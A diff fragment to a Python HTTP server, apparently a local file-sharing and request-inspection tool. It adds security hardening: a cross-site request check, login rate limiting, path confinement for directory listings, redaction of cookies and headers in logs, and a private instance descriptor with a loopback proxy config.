+        if self.headers.get('Sec-Fetch-Site') == 'cross-site':
+            return False
+        return self._local_operator() or (bool(auth_password) and self._session_valid())
 
     def _redirect(self, target):
         self._send(303, b'', 'text/plain', (('Location', target), ('Cache-Control', 'no-store')))
@@ -4368,6 +4958,10 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         prune_auth()
         with auth_lock:
             blocked = len(auth_failures.get(address, [])) >= AUTH_ATTEMPTS
+        if blocked:
+            self._send(429, login_page('Too many attempts. Try again later.', next_path),
+                       'text/html; charset=utf-8', LOGIN_HEADERS)
+            return
         if hmac.compare_digest(password.encode(), auth_password.encode()):
             with auth_lock:
                 auth_failures.pop(address, None)
@@ -4462,17 +5056,21 @@ class Handler(http.server.SimpleHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(result)
         elif self.path == '/ls' or self.path.startswith('/ls/'):
+            if mode != 'dir':
+                self.send_error(404); return
             raw = urllib.parse.unquote(self.path[3:]) or '/'
             base = os.path.realpath(os.getcwd())
             rel = raw.lstrip('/')
             full = os.path.realpath(os.path.join(base, rel))
-            if os.path.commonpath((base, full)) != base:
+            if os.path.commonpath((base, full)) != base or not self.safe_shared_path(full):
                 self.send_error(403); return
             if not os.path.isdir(full):
                 self.send_error(404); return
             entries = []
             for name in sorted(os.listdir(full)):
                 p = os.path.join(full, name)
+                if not self.safe_shared_path(p):
+                    continue
                 try:
                     s = os.stat(p)
                     if stat.S_ISDIR(s.st_mode):
@@ -4774,7 +5372,7 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                 origin = self.headers.get("Origin")
                 if origin: lines.append(f"{SEP} {BL}Origin{W}    {origin}")
                 cookie = self.headers.get("Cookie")
-                if cookie: lines.append(f"{SEP} {BL}Cookies{W}   {cookie}")
+                if cookie: lines.append(f"{SEP} {BL}Cookies{W}   [redacted]")
                 conn = self.headers.get("Connection")
                 if conn: lines.append(f"{SEP} {BL}Conn{W}      {conn}")
                 if self.headers.get("DNT") == "1":
@@ -4787,7 +5385,7 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                     kl = k.lower()
                     if kl.startswith("sec-") or kl in ("cache-control", "pragma", "authorization",
                         "if-modified-since", "if-none-match", "upgrade-insecure-requests"):
-                        extras.append(f"  {k}: {self.headers[k]}")
+                        extras.append(f"  {k}: {redact_header(k, self.headers[k])}")
                 if extras:
                     lines.append(f"{SEP} {DM}──────{W}")
                     for extra in extras:
@@ -4816,7 +5414,7 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                            "Content-Type", "Content-Length", "X-Forwarded-For",
                            "Authorization", "DNT"):
                     value = self.headers.get(k)
-                    if value: entry[k.lower().replace("-","_")] = value
+                    if value: entry[k.lower().replace("-","_")] = redact_header(k, value)
             request_body = getattr(self, "request_body", b"")
             if request_body:
                 entry["body"] = request_body.decode("utf-8", errors="replace")
@@ -4828,6 +5426,49 @@ class Server(socketserver.ThreadingTCPServer):
     daemon_threads = True
     request_queue_size = 128
 
+
+def write_private(path, content):
+    fd, temporary = tempfile.mkstemp(dir=path.parent)
+    try:
+        with os.fdopen(fd, 'w') as stream:
+            stream.write(content)
+        os.replace(temporary, path)
+    finally:
+        if os.path.exists(temporary):
+            os.unlink(temporary)
+
+
+def publish_local_instance():
+    if not console_enabled:
+        return
+    directory = Path.home() / '.expose' / 'instances'
+    directory.mkdir(parents=True, exist_ok=True, mode=0o700)
+    directory.chmod(0o700)
+    descriptor = directory / f'{port}.json'
+    instance = {'pid': os.getpid(), 'port': port, 'operator_token': operator_token,
+                'origin': f'http://127.0.0.1:{port}',
+                'public_origin': os.environ.get('EXPOSE_PUBLIC_URL', '')}
+    config = directory / f'{port}.proxychains.conf'
+    if consoles.proxy:
+        proxy = consoles.proxy
+        host, proxy_port = proxy.parse_bind(proxy.bind)
+        instance['proxy'] = {'host': host, 'port': proxy_port,
+                             'loopback_only': True}
+        instance['proxy_config'] = str(config)
+        write_private(config, 'strict_chain\nproxy_dns\ntcp_read_time_out 15000\n'
+                      'tcp_connect_time_out 8000\n[ProxyList]\n'
+                      f'socks5 {host} {proxy_port}\n')
+    write_private(descriptor, json.dumps(instance))
+
+    def remove_instance():
+        try:
+            if json.loads(descriptor.read_text()).get('pid') == os.getpid():
+                descriptor.unlink()
+                config.unlink(missing_ok=True)
+        except (OSError, ValueError):
+            pass
+    atexit.register(remove_instance)
+
 with Server((bind_addr, port), Handler) as httpd:
     _httpd = httpd
 
@@ -4836,7 +5477,7 @@ with Server((bind_addr, port), Handler) as httpd:
 
     signal.signal(signal.SIGINT, stop_server)
     signal.signal(signal.SIGTERM, stop_server)
-
+    publish_local_instance()
     httpd.serve_forever()
 PYEOF
 }
